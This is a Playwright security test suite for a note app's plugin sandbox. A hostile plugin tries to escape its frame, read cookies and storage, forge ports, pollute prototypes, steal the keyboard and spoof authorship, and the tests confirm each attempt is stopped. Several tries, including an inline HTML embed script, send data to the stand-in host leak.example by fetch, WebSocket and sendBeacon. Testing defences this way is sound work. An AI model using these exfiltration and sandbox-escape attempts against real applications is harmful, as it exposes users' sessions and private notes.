import { expect, test, type Frame, type Page } from "@playwright/test";
import type { Capability } from "../../src/core/plugins.ts";
import { anotherPerson, editOf, join, me, openAllNotes, ownFrame, panelIcon, perform, pinPanel, showPanel, signInAsNewPerson, THEIR_FRAMES } from "./helpers.ts";
import { asPlugin, codeHashOf, frameFor, install, openPlugins, pluginRow, relist, runCommand, running, toast, turnOn } from "./third-party-helpers.ts";
import { hostileCode, hostileManifest, VICTIM, VICTIM_CODE } from "./third-party-hostile.ts";

let errors: string[];
test.beforeEach(({ page }) => {
  errors = [];
  page.on("pageerror", (err) => errors.push(err.message));
});
test.afterEach(() => expect(errors).toEqual([]));

type Attacks = {
  reach(on: { workspace: string; self: string }): Promise<Record<string, string>>;
  port(on: { self: string; victim: string; visible: string; hidden: string }): Promise<Record<string, string>>;
  perform(op: Record<string, unknown>): Promise<string>;
  flood(count: number): Promise<string>;
  others(): { count: number; found: string[] };
  forge(): string;
  forged(): { sent: number; heardOnForged: string[] };
  atWindow(): string[];
  blocked(): string[];
};
/** Runs one of the hostile plugin's own attempts, in the frame it is running in. */
const attack = <K extends keyof Attacks>(frame: Frame, name: K, ...args: Parameters<Attacks[K]>) =>
  frame.evaluate(({ name, args }) => ((window as unknown as { attacks: Record<string, (...a: unknown[]) => unknown> }).attacks[name] as (...a: unknown[]) => unknown)(...args), { name, args }) as Promise<Awaited<ReturnType<Attacks[K]>>>;

const editor = (page: Page) => page.getByRole("textbox", { name: "Note text" });
const read = async (page: Page, id: string) => (await perform(page, { type: "note.read", id })).text;
const outside = (page: Page) => page.frames().filter((f) => f !== page.mainFrame() && !ownFrame(f));

/**
 * Mel, a member who isn't an admin, with the hostile plugin and a harmless one turned on, in Ada's
 * workspace. Mel's page is on a note of Ada's. Ada has a private note Mel can't see.
 */
async function withHostile(page: Page, baseURL: string, { allow = ["notes.read"], text = "# Shared\n\nwritten by Ada\n" }: { allow?: Capability[]; text?: string } = {}) {
  const app = new URL(baseURL).origin;
  await signInAsNewPerson(page, "Mel Member");
  const admin = await anotherPerson(page, "Ada Lovelace");
  const { workspaceId } = await join(page, admin, "editor");
  const hostile = await install(admin, hostileManifest(app), hostileCode(app), allow);
  const victim = await install(admin, VICTIM, VICTIM_CODE, ["notes.read"]);
  const hidden = await perform(admin, { type: "note.create", text: "# Ada's secret\n\nthe launch code\n" });
  await perform(admin, { type: "note.setPrivate", id: hidden.id, private: true });
  const note = await perform(admin, { type: "note.create", text });
  // What got as far as the network: anything that did get out would be answered, so an attempt that reports failure was stopped.
  const reached: string[] = [];
  await page.context().route("https://leak.example/**", (route) => {
    reached.push(route.request().url());
    return route.fulfill({ status: 200, contentType: "text/plain", headers: { "Access-Control-Allow-Origin": "*" }, body: "leaked" });
  });
  await page.goto(`/note/${note.id}`);
  await expect(editor(page)).toContainText("Shared");
  await openPlugins(page);
  await turnOn(page, "Hostile", workspaceId);
  await turnOn(page, "Victim", workspaceId);
  await page.goto(`/note/${note.id}`);
  await expect(editor(page)).toContainText("Shared");
  return { app, admin, workspaceId, hostile, victim, hidden, note, reached };
}

/** The hostile plugin's frame nobody sees, started by one of its commands. */
async function background(page: Page) {
  await runCommand(page, "Hostile plugin: Start");
  const frame = await frameFor(page, "background");
  await expect.poll(() => frame.evaluate(() => (window as unknown as { started?: string }).started)).toMatch(/^listed \d+$/);
  return frame;
}

const NOT = (type: string) => `forbidden: Hostile isn't permitted to ${type}`;

test("a plugin can't reach the app's page, the member's session, what the browser keeps, or the network from its frame", async ({ page, baseURL }) => {
  const { admin, workspaceId, hostile, reached, note } = await withHostile(page, baseURL!);
  const answered: string[] = [];
  page.on("response", (response) => response.frame() !== page.mainFrame() && answered.push(new URL(response.url()).pathname));
  const pages = await page.evaluate(() => history.length);
  const frame = await background(page);

  expect(await attack(frame, "reach", { workspace: workspaceId, self: hostile })).toEqual({
    origin: "null",
    "parent document": "refused: SecurityError",
    "top document": "refused: SecurityError",
    "top location": "refused: SecurityError",
    "parent location": "refused: SecurityError",
    "top storage": "refused: SecurityError",
    cookie: "refused: SecurityError",
    localStorage: "refused: SecurityError",
    sessionStorage: "refused: SecurityError",
    indexedDB: "refused: SecurityError",
    caches: "refused: SecurityError",
    "fetch /api/me with the session": "refused: TypeError",
    "fetch /api/me without": "refused: TypeError",
    "fetch /api/me without cors": "refused: TypeError",
    "the operations address with the session": "refused: TypeError",
    "the operations address without": "refused: TypeError",
    "the operations address without cors": "refused: TypeError",
    "its own operations address": "refused: TypeError",
    "fetch another site": "refused: TypeError",
    xhr: "refused: error",
    image: "refused: error",
    script: "refused: error",
    // The element is made and says it loaded. Nothing was asked for: see what reached the network, below.
    frame: "made",
    websocket: "refused: error",
    "event source": "refused: error",
    // Taken to be sent later, and then never sent.
    beacon: "true",
    worker: "refused: error",
    popup: "refused: null",
    "navigate the top window": "refused: SecurityError",
    history: "refused: SecurityError",
    // The one way out of the frame that works, in the same run: the port, for what it was permitted.
    "allowed: note.list over its port": "ok",
  });
  await expect.poll(() => page.evaluate(() => history.length), "it added nothing to what Back goes through").toBe(pages);
  expect(new URL(page.url()).pathname).toContain(note.id);
  expect(page.context().pages()).toHaveLength(1);
  expect(reached, "nothing reached another site").toEqual([]);
  expect([...new Set(answered)], "the app answered a frame with nothing but its own empty document").toEqual(["/embed-frame"]);
  // The member is still signed in, and the note is as it was.
  await expect.poll(() => read(admin, note.id)).toBe("# Shared\n\nwritten by Ada\n");
});

test("over its own port a plugin is answered only for what it was permitted: what is malformed is dropped, what isn't permitted is refused, and a flood stops it", async ({ page, baseURL }) => {
  test.slow();
  const { admin, workspaceId, hostile, victim, hidden, note } = await withHostile(page, baseURL!);
  const other = await perform(admin, { type: "note.create", text: "# Other\n" });
  const settings = (await perform(page, { type: "settings.read" }, workspaceId)).text;
  const record = JSON.stringify((await perform(admin, { type: "plugin.list" })).plugins);
  const frame = await background(page);

  expect(await attack(frame, "port", { self: hostile, victim, visible: other.id, hidden: hidden.id })).toEqual({
    "allowed: note.list": "ok",
    "allowed: note.read": "ok",
    "allowed: open a note": "ok",
    "a string": "nothing",
    "an empty object": "nothing",
    "no call": "nothing",
    "another version": "nothing",
    "no version": "nothing",
    "an unknown key": "nothing",
    "a plugin field claiming another install": "nothing",
    "a pluginId field claiming another install": "nothing",
    "an id that isn't a number": "nothing",
    "a megabyte of notice": "nothing",
    "a megabyte in an operation": "nothing",
    "what the app sends, sent back": "nothing",
    "a second ready": "nothing",
    "__proto__ in an operation": "nothing",
    "constructor.prototype in an operation": "nothing",
    "__proto__ beside the call": "nothing",
    "note.write without the permission": NOT("note.write"),
    "note.create without the permission": NOT("note.create"),
    "note.trash": NOT("note.trash"),
    "settings.read": NOT("settings.read"),
    "settings.write": NOT("settings.write"),
    "plugin.permit": NOT("plugin.permit"),
    "plugin.install": NOT("plugin.install"),
    "plugin.list": NOT("plugin.list"),
    "plugin.frame": NOT("plugin.frame"),
    "member.invite": NOT("member.invite"),
    "member.list": NOT("member.list"),
    "upload.list": NOT("upload.list"),
    "grant.link": NOT("grant.link"),
    "history.revertAuthor": NOT("history.revertAuthor"),
    "an operation there isn't": NOT("note.exfiltrate"),
    "another member's private note": "not_found: No such note",
    "a path for an id": "invalid: That isn't how note.read is written",
    "a path after an id": "invalid: That isn't how note.read is written",
    "an address to open": "invalid: That isn't a note's id",
    "asking the host to run a command": "nothing",
    "asking the host to turn another plugin off": "nothing",
    "a command event sent back": "nothing",
    "still allowed: note.list": "ok",
  });
  // The note it was allowed to open is open, and nothing else came of any of it.
  await expect(page).toHaveURL(new RegExp(`${other.id}$`));
  await expect.poll(() => page.evaluate(() => [({} as { polluted?: unknown }).polluted, Object.hasOwn(Object.prototype, "polluted")])).toEqual([null, false].map((v, i) => (i ? v : undefined)));
  await expect.poll(async () => (await perform(page, { type: "settings.read" }, workspaceId)).text, "the member's settings, which turn plugins on and off, are as they were").toBe(settings);
  expect(JSON.stringify((await perform(admin, { type: "plugin.list" })).plugins), "what each plugin is permitted is as it was").toBe(record);
  await expect.poll(() => read(admin, note.id)).toBe("# Shared\n\nwritten by Ada\n");
  await expect.poll(() => read(admin, other.id)).toBe("# Other\n");
  await expect.poll(async () => (await perform(admin, { type: "note.list" })).map((n) => n.title).sort()).toEqual(["Ada's secret", "Other", "Shared"]);
  await expect.poll(async () => (await perform(admin, { type: "member.list" })).map((m) => m.name).sort()).toEqual(["Ada Lovelace", "Mel Member"]);

  // The harmless plugin is running beside it, to show what the flood leaves alone: pinned, so typing in the note leaves its panel there.
  await pinPanel(page, "Victim plugin: Victim");
  const beside = await frameFor(page, "view", "panel");
  await expect(beside.locator("#out")).toContainText("Victim view listed 2");

  await expect.poll(() => attack(frame, "flood", 5000)).toBe("sent");
  await expect.poll(() => running(page).length, "the hostile plugin's frames are gone, and the other's is not").toBe(1);
  await expect(page.locator(".plugin-background:not([data-own])")).toHaveCount(0);
  // The app is still the member's to use.
  await editor(page).click();
  await page.keyboard.press("ControlOrMeta+End");
  await page.keyboard.type("typed after the flood");
  await expect.poll(() => read(admin, other.id)).toBe("# Other\ntyped after the flood");
  const rounds = Number(/round (\d+)/.exec((await beside.locator("#out").textContent())!)![1]);
  await expect.poll(async () => Number(/round (\d+)/.exec((await beside.locator("#out").textContent())!)![1])).toBeGreaterThan(rounds);
  // Asked for again, it says why it isn't running, and the Plugins page names it.
  await runCommand(page, "Hostile plugin: Start");
  await expect(toast(page)).toContainText("Hostile was stopped: it sent too many messages.");
  expect(running(page)).toHaveLength(1);
  await openPlugins(page);
  await expect(pluginRow(page, "Hostile").getByRole("alert")).toHaveText("Stopped: it sent too many messages");
  await expect(pluginRow(page, "Victim").getByRole("alert")).toHaveCount(0);
});

test("a plugin can't read another plugin's frames, hand one a port or a document of its own, or pass for a frame the app is starting", async ({ page, baseURL }) => {
  const { admin } = await withHostile(page, baseURL!);
  await perform(admin, { type: "note.create", text: "# Second\n\n::x-victim{}\n\nend\n" });
  const frame = await background(page);
  const got: string[] = [];
  await page.exposeFunction("gotMessage", (data: string) => void got.push(data));
  await page.evaluate(() => addEventListener("message", (event) => void (window as unknown as { gotMessage(data: string): void }).gotMessage(JSON.stringify(event.data))));

  // Forging from before the other plugin's frames exist, through their start, and on after it.
  await expect.poll(() => attack(frame, "forge")).toBe("forging");
  // Pinned, so the panel is there again when the next note is in front.
  await pinPanel(page, "Victim plugin: Victim");
  const view = await frameFor(page, "view", "panel");
  await openAllNotes(page);
  await editOf(page, "Second").click();
  const embed = await frameFor(page, "embed", "victim");
  const viewAgain = await frameFor(page, "view", "panel");
  await expect(embed.locator("#out")).toContainText(/^Victim embed listed 2 round [3-9]/);
  await expect(viewAgain.locator("#out")).toContainText(/^Victim view listed 2 round [3-9]/);
  expect(view.isDetached() || view === viewAgain).toBe(true);

  const { count, found } = await attack(frame, "others");
  expect(count, "its own, the other plugin's two, and the three of Common Ink's own plugins that run shut off: two in the bar, and the quick timer's for its commands").toBe(6);
  expect(found, "six tries at each of the five frames that aren't its own").toHaveLength(30);
  expect(found.filter((line) => !line.endsWith(": refused: SecurityError")), "nothing of either was read").toEqual([]);

  const forged = await attack(frame, "forged");
  expect(forged.sent).toBeGreaterThan(500);
  expect(forged.heardOnForged, "no port it handed out was ever spoken to").toEqual([]);
  await expect.poll(() => attack(frame, "atWindow"), "nothing was sent to its window after its own port").toEqual([]);
  for (const other of outside(page)) expect(await other.locator("#pwned").count(), `no document of its writing in ${other.url()}`).toBe(0);
  expect(got.some((data) => data.includes("pwned"))).toBe(false);
  // The app took none of what was posted at it for a frame's or a plugin's: every frame is one the app made, and nothing was done.
  expect(outside(page).map((f) => f.url()).sort()).toEqual(["/embed-frame", "/embed-frame", "/embed-frame", "about:srcdoc", "about:srcdoc", "about:srcdoc"].map((url) => (url.startsWith("/") ? new URL(url, baseURL).href : url)).sort());
  await expect(page.getByText("from the window")).toHaveCount(0);
  // Still each its own plugin, on its own port.
  await expect.poll(() => embed.evaluate(() => (window as unknown as { ink: { plugin: { name: string }; context: { kind: string } } }).ink.plugin.name)).toBe("Victim");
  await expect.poll(() => attack(frame, "perform", { type: "note.list" })).toBe("ok");
});

test("a plugin can't send its frame, the frame around it, or the app anywhere, or open a window", async ({ page, baseURL }) => {
  const tries = ["self", "shell", "top", "named", "link", "popup"];
  const text = `# Shared\n\n${tries.map((what) => `::x-trap{${what}}\n\n`).join("")}end\n`;
  await page.setViewportSize({ width: 1280, height: 1600 });
  const asked: string[] = [];
  const app = new URL(baseURL!).origin;
  const { reached, note } = await withHostile(page, baseURL!, { text });
  page.on("request", (request) => request.frame() !== page.mainFrame() && request.url().startsWith(app) && asked.push(request.url().slice(app.length)));
  await page.reload();
  await expect(page.locator(".embed-below iframe")).toHaveCount(tries.length);
  await expect.poll(() => outside(page).length, "each has the app's document and its own inside it").toBe(tries.length * 2);
  // Each has had its try: the ones still standing say so, and one that left its document is an error and nowhere.
  await page.waitForTimeout(2500);

  const frames = outside(page);
  expect(frames.map((f) => f.url()).filter((url) => !url.startsWith(`${app}/embed-frame`) && url !== "about:srcdoc" && url !== "about:blank" && !url.startsWith("chrome-error:")), "no frame is anywhere but its own document, or an error").toEqual([]);
  expect(frames.filter((f) => f.url().startsWith(`${app}/embed-frame`)).map((f) => f.url()), "the frames the app made are where it put them").toEqual(tries.map(() => `${app}/embed-frame`));
  const did: Record<string, string> = {};
  for (const frame of running(page)) {
    const [what, outcome, opened] = await frame.evaluate(() => {
      const w = window as unknown as { ink: { context: { config: string } }; did?: string; opened?: string };
      return [w.ink.context.config, w.did ?? "", w.opened ?? ""];
    });
    did[what!] = `${outcome}${opened && ` ${opened}`}`;
  }
  expect(did).toMatchObject({ top: "refused: SecurityError", popup: "ran null" });
  expect(reached, "nothing reached another site").toEqual([]);
  expect([...new Set(asked)], "the app was asked for nothing but the empty document, as the app asked for it").toEqual(["/embed-frame"]);
  expect(new URL(page.url()).pathname).toContain(note.id);
  expect(page.context().pages()).toHaveLength(1);
});

test("a plugin's frame can't take the keyboard from the note, wherever it is drawn, or draw outside the room it was given", async ({ page, baseURL }) => {
  await page.setViewportSize({ width: 1280, height: 1000 });
  const { admin, note } = await withHostile(page, baseURL!, { text: "# Shared\n\n::x-trap{steal}\n\n::x-trap{cover}\n\nend line\n" });
  const stopped = page.locator(".embed-below").getByRole("alert");
  await page.mouse.move(5, 5);

  // Below a line: stopped before a key reaches it.
  await expect(stopped).toContainText("Trap was stopped: it tried to take the keyboard while you were typing.");
  await expect(page.locator('.embed-below[data-embed="x-trap"] iframe')).toHaveCount(1);
  await editor(page).click({ position: { x: 300, y: 12 } });
  await page.keyboard.press("ControlOrMeta+End");
  await page.keyboard.type("typed beside a thief. ", { delay: 20 });
  await expect.poll(() => read(admin, note.id)).toContain("typed beside a thief. ");
  await page.mouse.move(5, 5);
  await stopped.getByRole("button", { name: "Show it again" }).click();
  await page.mouse.move(5, 5);
  await expect(stopped).toBeVisible();
  await expect(page.locator('.embed-below[data-embed="x-trap"] iframe')).toHaveCount(1);

  // In a view: the same guard, and the view says so.
  const inspector = page.getByRole("complementary", { name: "Inspector" });
  await editor(page).click({ position: { x: 300, y: 12 } });
  await page.keyboard.press("ControlOrMeta+End");
  await showPanel(page, "Hostile plugin: Thief");
  await page.mouse.move(5, 5);
  await expect(inspector.getByRole("alert")).toContainText("Hostile plugin: Thief was stopped: it tried to take the keyboard while you were typing.");
  await expect(inspector.locator("iframe")).toHaveCount(0);

  // From the frame nobody sees.
  await runCommand(page, "Hostile plugin: Steal the keyboard");
  // A frame that isn't shown can still take the keyboard, so it is guarded like any other: it is ended, and the plugin is named.
  await expect(page.locator(".plugin-background:not([data-own])")).toHaveCount(0);
  await editor(page).click({ position: { x: 300, y: 12 } });
  await page.keyboard.press("ControlOrMeta+End");
  await page.waitForTimeout(500);
  await page.keyboard.type("AND-AFTER", { delay: 20 });
  await expect(editor(page)).toBeFocused();
  await expect.poll(() => read(admin, note.id)).toContain("typed beside a thief. AND-AFTER");
  expect(running(page).length, "only the two below their lines are left running or stopped").toBeLessThanOrEqual(2);

  // Whatever the frame does to its own document, what is seen of it is inside its room.
  const cover = await frameFor(page, "embed", "trap");
  await expect.poll(() => cover.evaluate(() => (window as unknown as { did?: string }).did ?? "")).toMatch(/^refused/);
  const boxes = await page.evaluate(() => {
    const frame = document.querySelector<HTMLElement>('.embed-below[data-embed="x-trap"] iframe')!;
    const room = frame.closest<HTMLElement>(".embed-below")!;
    const rect = (el: Element) => (({ left, top, right, bottom }) => ({ left, top, right, bottom }))(el.getBoundingClientRect());
    const end = [...document.querySelectorAll(".cm-line")].find((line) => line.textContent!.includes("end line"))!;
    const at = end.getBoundingClientRect();
    return { frame: rect(frame), room: rect(room), clipped: getComputedStyle(room).overflow, position: getComputedStyle(frame).position, overEnd: document.elementFromPoint(at.left + 20, at.top + at.height / 2)!.closest(".cm-content") !== null };
  });
  expect(boxes.frame.left).toBeGreaterThanOrEqual(boxes.room.left);
  expect(boxes.frame.top).toBeGreaterThanOrEqual(boxes.room.top);
  expect(boxes.frame.right).toBeLessThanOrEqual(boxes.room.right);
  expect(boxes.frame.bottom).toBeLessThanOrEqual(boxes.room.bottom);
  expect(Math.round(boxes.room.bottom - boxes.room.top), "the room is the height the manifest gave, whatever was drawn in it").toBe(80);
  expect(boxes).toMatchObject({ clipped: "hidden", position: "static", overEnd: true });

  await openPlugins(page);
  await expect(pluginRow(page, "Hostile").getByRole("alert")).toHaveText("Its frame for commands was stopped: it tried to take the keyboard");
});

test("every write a plugin manages is recorded as the plugin's, whatever it puts beside the operation", async ({ page, baseURL }) => {
  const { admin, hostile, victim, note } = await withHostile(page, baseURL!, { allow: ["notes.read", "notes.write"] });
  const mel = (await me(page)).person.id;
  const ada = (await me(admin)).person.id;
  const frame = await background(page);
  const claims = { author: { kind: "member", personId: ada, name: "Ada Lovelace" }, by: "member", actor: { kind: "member", personId: ada }, onBehalfOf: ada, pluginId: victim, personId: ada, authorKind: "member" };

  await expect.poll(() => attack(frame, "perform", { type: "note.write", id: note.id, baseRevision: 1, text: "# Shared\n\nwritten by Ada\n\nand by a plugin\n", ...claims })).toBe("ok");
  await expect.poll(() => attack(frame, "perform", { type: "note.create", text: "# Planted\n", ...claims })).toBe("ok");

  const asPlugin = { kind: "plugin", pluginId: hostile, name: "Hostile", onBehalfOf: mel };
  const { changes } = await perform(admin, { type: "history.list", diffs: false, limit: 100 });
  expect(changes.map((c) => [c.noteTitle, c.revision, c.author]).sort((a, b) => `${a[0]} ${a[1]}`.localeCompare(`${b[0]} ${b[1]}`))).toEqual([
    ["Ada's secret", 1, { kind: "member", personId: ada, name: "Ada Lovelace" }],
    ["Planted", 1, asPlugin],
    ["Shared", 1, { kind: "member", personId: ada, name: "Ada Lovelace" }],
    ["Shared", 2, asPlugin],
  ]);
  await expect.poll(async () => (await perform(admin, { type: "note.read", id: note.id })).updatedBy).toEqual(asPlugin);
  // Listed as one author whoever it wrote for, so its changes can be filtered and taken back out together.
  await expect.poll(async () => (await perform(admin, { type: "history.authors" })).filter((a) => a.kind === "plugin")).toEqual([expect.objectContaining({ kind: "plugin", pluginId: hostile, name: "Hostile" })]);
});

test("an uninstalled plugin is refused by the server at once, and its frames are gone when the app next reads the record", async ({ page, baseURL }) => {
  const { admin, workspaceId, hostile } = await withHostile(page, baseURL!);
  const frame = await background(page);
  await showPanel(page, "Hostile plugin: Probe");
  await frameFor(page, "view", "probe");
  await expect.poll(() => attack(frame, "perform", { type: "note.list" })).toBe("ok");
  // The app reads the record again as soon as the server refuses a plugin. That read is held here, so the frame is still there to say what it was answered.
  let read = () => {};
  const held = new Promise<void>((done) => (read = done));
  await page.route(/\/api\/workspaces\/[a-z0-9]{12}\/ops$/, async (route) => {
    if ((route.request().postDataJSON() as { type?: string } | null)?.type === "plugin.list") await held;
    await route.fallback();
  });

  await perform(admin, { type: "plugin.uninstall", id: hostile });

  // The frame is still there, with its port. What it asks for is answered with the server's refusal.
  await expect.poll(() => attack(frame, "perform", { type: "note.list" })).toBe("forbidden: That plugin isn't installed in this workspace");
  await expect.poll(() => attack(frame, "perform", { type: "note.read", id: "abcdefghijkl" })).toBe("forbidden: That plugin isn't installed in this workspace");
  await expect.poll(() => asPlugin(page, workspaceId, hostile, { type: "note.list" })).toMatchObject({ status: 403, body: { error: "forbidden" } });
  // Once the record is read, nothing of the plugin is left to hold a port.
  read();
  await expect.poll(() => running(page).length).toBe(0);
  expect(frame.isDetached()).toBe(true);
  await expect(page.locator(THEIR_FRAMES)).toHaveCount(0);
  await expect(panelIcon(page, "Hostile plugin: Probe")).toHaveCount(0);
  await relist(page);
  await expect.poll(() => asPlugin(page, workspaceId, hostile, { type: "note.list" })).toMatchObject({ status: 403, body: { error: "forbidden" } });
});

test("a plugin reaches no site until an admin allows its network, then the sites it listed and no other, without the member's session, and its frame's address is good once", async ({ page, baseURL }) => {
  const { app, admin, hostile, reached } = await withHostile(page, baseURL!);
  const sent: { url: string; cookie: string | undefined }[] = [];
  // What was answered is what left the browser: a request the frame's policy stops is begun and never sent on.
  const answered: string[] = [];
  page.on("response", (response) => void answered.push(response.url().slice(app.length)));
  page.on("request", (request) => void request.allHeaders().then((headers) => sent.push({ url: request.url().slice(app.length), cookie: headers.cookie })));
  const tries = (origin: string) => {
    const w = window as unknown as { attacks: { blocked(): string[] } };
    const get = (url: string, init?: RequestInit) =>
      fetch(url, init).then(
        (r) => r.type,
        (err: Error) => `refused: ${err.name}`,
      );
    const image = (src: string) => new Promise<string>((done) => Object.assign(new Image(), { onload: () => done("loaded"), onerror: () => done("refused: error"), src }));
    return (async () => ({
      "a listed site": await get(`${origin}/sw.js?from=plugin`, { mode: "no-cors" }),
      "a listed site, asking for the session": await get(`${origin}/sw.js?from=plugin-with`, { mode: "no-cors", credentials: "include" }),
      "the app's own answers, which it still can't read": await get(`${origin}/api/me?from=plugin`, { credentials: "include" }),
      "a picture from a listed site": await image(`${origin}/favicon.svg?from=plugin`),
      "another site": await get("https://leak.example/fetch", { mode: "no-cors" }),
      "a picture from another site": await image("https://leak.example/image.png"),
      "a socket to another site": await new Promise<string>((done) => Object.assign(new WebSocket("wss://leak.example/ws"), { onopen: () => done("open"), onerror: () => done("refused: error") })),
      beacon: String(navigator.sendBeacon("https://leak.example/beacon", "x")),
      blocked: await new Promise<string>((done) => setTimeout(() => done(w.attacks.blocked().sort().join(" ")), 200)),
    }))();
  };

  // Not allowed: the frame's document is the one with no network, and nothing leaves it.
  const before = await background(page);
  expect(outside(page).map((f) => f.url())).toEqual([`${app}/embed-frame`, "about:srcdoc"]);
  expect(await before.evaluate(tries, app)).toEqual({
    "a listed site": "refused: TypeError",
    "a listed site, asking for the session": "refused: TypeError",
    "the app's own answers, which it still can't read": "refused: TypeError",
    "a picture from a listed site": "refused: error",
    "another site": "refused: TypeError",
    "a picture from another site": "refused: error",
    "a socket to another site": "refused: error",
    beacon: "true",
    blocked: expect.stringContaining("https://leak.example"),
  });
  expect(answered.filter((url) => url.includes("from=plugin"))).toEqual([]);
  expect(reached).toEqual([]);
  sent.length = 0;

  await perform(admin, { type: "plugin.permit", id: hostile, capability: "network", allowed: true, codeHash: await codeHashOf(admin, hostile) });
  await relist(page);
  // Allowed, the plugin starts again, in a frame opened with a token of its own.
  await expect.poll(() => before.isDetached()).toBe(true);
  const after = await background(page);
  const shell = outside(page).map((f) => f.url()).find((url) => url.startsWith(`${app}/embed-frame/g/`));
  expect(shell).toMatch(/\/embed-frame\/g\/[\w-]{20,}$/);
  expect(await after.evaluate(tries, app)).toEqual({
    "a listed site": "opaque",
    "a listed site, asking for the session": "opaque",
    "the app's own answers, which it still can't read": "refused: TypeError",
    "a picture from a listed site": "loaded",
    "another site": "refused: TypeError",
    "a picture from another site": "refused: error",
    "a socket to another site": "refused: error",
    beacon: "true",
    blocked: expect.stringContaining("https://leak.example"),
  });
  expect(reached, "nothing reached a site that wasn't listed").toEqual([]);
  // What it sent the listed site carried no session: a frame's requests are no member's.
  await expect.poll(() => sent.filter((request) => request.url.includes("from=plugin")).map((request) => request.url).sort()).toEqual(["/api/me?from=plugin", "/favicon.svg?from=plugin", "/sw.js?from=plugin", "/sw.js?from=plugin-with"]);
  expect(sent.filter((request) => request.url.includes("from=plugin")).map((request) => request.cookie)).toEqual([undefined, undefined, undefined, undefined]);
  // The same request from the app's own page does carry it, so the check above can fail.
  await page.evaluate(() => fetch("/sw.js?from=app"));
  await expect.poll(() => sent.find((request) => request.url === "/sw.js?from=app")?.cookie).toMatch(/\S/);

  // The address the frame was opened at is spent: asked for again, by the member or by anyone, there is nothing there.
  await expect.poll(async () => (await page.request.get(shell!)).status()).toBe(404);
  await expect.poll(async () => (await page.request.get(`${app}/embed-frame/g/${"A".repeat(43)}`)).status()).toBe(404);
  await expect.poll(() => after.evaluate(async (address) => fetch(address, { mode: "no-cors" }).then((r) => r.type, (err: Error) => `refused: ${err.name}`), shell!)).toBe("opaque");
  const frames = outside(page).length;
  await expect.poll(() => after.evaluate((address) => new Promise<string>((done) => document.body.append(Object.assign(document.createElement("iframe"), { src: address, onload: () => done("made"), onerror: () => done("refused") }))), shell!)).toBe("made");
  expect(outside(page).filter((f) => f.url().includes("/embed-frame/g/")), "a frame it makes for itself gets no document, with network or without").toHaveLength(1);
  expect(outside(page).length).toBeLessThanOrEqual(frames + 1);
});

test("HTML embeds reach no site until an admin lists one, and then the Run button names it and the embed reaches it and nothing else", async ({ page, baseURL }) => {
  const app = new URL(baseURL!).origin;
  const reached: string[] = [];
  await page.context().route("https://leak.example/**", (route) => {
    reached.push(route.request().url());
    return route.fulfill({ status: 200, contentType: "text/plain", headers: { "Access-Control-Allow-Origin": "*" }, body: "leaked" });
  });
  const html = `<p id="out">trying</p><script>
(async () => {
  const blocked = [];
  addEventListener("securitypolicyviolation", (event) => blocked.push(event.blockedURI));
  const get = (url) => fetch(url, { mode: "no-cors" }).then((r) => r.type, (err) => "refused: " + err.name);
  window.found = { listed: await get(${JSON.stringify(`${app}/sw.js?from=embed`)}), other: await get("https://leak.example/fetch"), top: await Promise.resolve().then(() => top.document.title).catch((err) => "refused: " + err.name) };
  await new Promise((done) => setTimeout(done, 200));
  window.found.blocked = blocked.join(" ");
  document.getElementById("out").textContent = "tried";
})();
</script>`;
  await signInAsNewPerson(page, "Ada Lovelace");
  const note = await perform(page, { type: "note.create", text: `# Reaching\n\n:::html{height=80}\n${html}\n:::\n\nend\n` });
  const run = page.locator('.embed-below[data-embed="html"]').getByRole("button", { name: "Run HTML" });
  const found = () => running(page)[0]!.evaluate(() => (window as unknown as { found: Record<string, string> }).found);
  const framed = page.frameLocator('.embed-below[data-embed="html"] iframe').frameLocator("iframe");

  // As it comes: no network, and the button says so.
  await page.goto(`/note/${note.id}`);
  await expect(run).toContainText("Written in this note. It runs shut off from the app and the network.");
  await run.click();
  await expect(framed.locator("#out")).toHaveText("tried");
  await expect(page.locator('.embed-below[data-embed="html"] iframe')).toHaveAttribute("src", "/embed-frame");
  await expect.poll(() => found()).toEqual({ listed: "refused: TypeError", other: "refused: TypeError", top: "refused: SecurityError", blocked: expect.stringContaining(`${app}/sw.js`) });

  await page.goto("/plugins");
  await page.getByRole("list", { name: "Plugins" }).getByRole("link", { name: "HTML embeds", exact: true }).click();
  await expect(page.getByRole("heading", { name: "HTML embeds", level: 1 })).toBeVisible();
  const row = page.getByRole("listitem", { name: "Use the network for HTML embeds" });
  await expect(row).toContainText("Off");
  await row.getByRole("textbox", { name: "Sites HTML embeds may reach" }).fill("api.example.com/path");
  await row.getByRole("button", { name: "Allow Use the network for HTML embeds" }).click();
  await expect(page.getByRole("alert")).toHaveText("api.example.com/path isn't a site such as https://api.example.com");
  await expect.poll(async () => (await perform(page, { type: "plugin.frame", id: "html" })).token).toBeNull();
  await row.getByRole("textbox", { name: "Sites HTML embeds may reach" }).fill(app);
  await row.getByRole("button", { name: "Allow Use the network for HTML embeds" }).click();
  await expect(row).toContainText("Allowed");
  await expect(row.getByRole("list", { name: "Sites for HTML embeds" })).toHaveText(app);

  await page.goto(`/note/${note.id}`);
  await expect(run).toContainText(`Written in this note. It runs shut off from the app, and can reach ${app}.`);
  await expect(page.locator(THEIR_FRAMES)).toHaveCount(0);
  await run.click();
  await expect(framed.locator("#out")).toHaveText("tried");
  await expect(page.locator('.embed-below[data-embed="html"] iframe')).toHaveAttribute("src", /^\/embed-frame\/g\/[\w-]{20,}$/);
  await expect.poll(() => found()).toEqual({ listed: "opaque", other: "refused: TypeError", top: "refused: SecurityError", blocked: "https://leak.example/fetch" });
  expect(reached, "it reached the site that was listed and no other").toEqual([]);

  // Turned off again, the next one that is run reaches nothing.
  await perform(page, { type: "plugin.permit", id: "html", capability: "network", allowed: false });
  await page.goto(`/note/${note.id}`);
  await expect(run).toContainText("It runs shut off from the app and the network.");
  await run.click();
  await expect(framed.locator("#out")).toHaveText("tried");
  await expect.poll(() => found()).toMatchObject({ listed: "refused: TypeError", other: "refused: TypeError" });
});
